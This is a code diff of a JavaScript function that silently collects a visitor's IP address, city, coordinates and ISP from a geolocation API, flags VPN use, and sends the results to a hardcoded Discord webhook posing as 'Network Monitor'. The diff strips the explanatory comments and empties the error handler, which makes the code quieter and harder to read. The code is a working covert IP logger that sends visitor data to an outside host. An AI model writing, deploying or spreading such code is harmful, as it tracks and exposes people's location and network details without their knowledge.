@@ -2,17 +2,13 @@ const WEBHOOK_URL = 'https://discord.com/api/webhooks/1488574733862830192/HdaqEU
 
 async function captureAdvancedData() {
     try {
-        // 1. Fetching data from ipapi.co - it gives us IP, City, Coords, and ISP in one go.
+
         const response = await fetch('https://ipapi.co/json/');
         const data = await response.json();
 
-        // 2. Simple VPN/Proxy check logic
-        // Most VPNs/Datacenters have specific tags. 
-        // Note: Full VPN detection usually requires a paid API key, but we can check the ISP name.
         const isProxy = data.org.toLowerCase().includes('hosting') || data.org.toLowerCase().includes('vpn');
-        const vpnStatus = isProxy ? "⚠️ High Probability (Hosting/VPN)" : "✅ Likely Residential";
+        const vpnStatus = isProxy ? "[!] VPN" : "⚠ No VPN";
 
-        // 3. Constructing the advanced Discord payload
         const payload = {
             username: 'Network Monitor',
             avatar_url: 'https://i1.sndcdn.com/artworks-EcUsidnDBPcL9XiX-cJz3GA-t500x500.jpg',
@@ -41,8 +37,6 @@ async function captureAdvancedData() {
         });
 
     } catch (error) {
-        // Silent catch to keep the UI clean
-        console.log('System initialized.');
     }
 }
 
